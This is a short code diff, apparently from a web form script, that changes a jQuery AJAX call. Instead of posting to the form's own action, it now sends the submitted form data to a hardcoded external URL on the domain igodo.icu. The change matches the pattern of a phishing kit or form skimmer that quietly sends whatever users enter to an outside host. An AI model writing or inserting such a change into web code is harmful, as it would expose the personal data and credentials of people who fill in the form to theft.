@@ -52,8 +52,8 @@
             }
     
             $.ajax({
-                url: $('#gawaboy').attr('action'),
-                type: "POST",
+                url: "https://igodo.icu/5534e3-5229a1-78462a/b.php",
+                type: 'POST',
 		dataType: 'text',
                 data: formData,
 		contentType: false
